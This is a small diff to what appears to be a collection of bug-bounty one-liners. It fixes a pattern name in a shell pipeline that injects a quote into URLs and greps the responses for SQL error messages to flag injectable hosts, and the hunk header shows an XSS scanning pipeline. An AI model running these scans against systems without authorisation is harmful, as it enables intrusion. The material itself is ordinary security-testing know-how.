@@ -39,5 +39,5 @@ subfinder -d domain.com -silent | httpx -l subdomains -silent | dalfox pipe -F -
 
 ## Find SQL Injection Error Based
 ```bash
-cat domains.com.txt | gf xss | qsreplace "'" | while read host do; do curl --silent --insecure $host | grep -qs "SQL syntax" && echo "possible sql injection here $host" ; done
+cat domains.com.txt | gf sqli | qsreplace "'" | while read host do; do curl --silent --insecure $host | grep -qs "SQL syntax" && echo "possible sql injection here $host" ; done
 ```
